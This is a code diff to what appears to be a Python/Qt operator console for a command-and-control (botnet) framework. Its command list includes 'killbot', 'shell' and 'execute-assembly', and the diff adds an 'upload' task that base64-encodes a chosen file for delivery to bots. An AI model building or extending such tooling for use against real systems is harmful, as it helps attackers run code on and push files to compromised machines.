@@ -57,7 +57,7 @@ QTextEdit {
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly', 'clear']
+        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly','upload',  'clear']
         self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
         self.completer.setCompletionMode(QCompleter.InlineCompletion)
 
@@ -118,7 +118,7 @@ QTextEdit {
 
         incomingFile = ""
         incomingFilename = ""
-        if text == 'execute-assembly':
+        if text == 'execute-assembly' or text == 'upload':
             file_name,_ = QFileDialog.getOpenFileName(self, "Open File",
                                                         ".",
                                                         "All files(*.*)")
@@ -149,6 +149,10 @@ QTextEdit {
             arg = ""
         else:
             arg = args[1]
+
+
+        # print(f"[+] Filename: {incomingFilename}")
+        # print(f"[+] file base64: {incomingFile}")
 
 
         bot_task = {
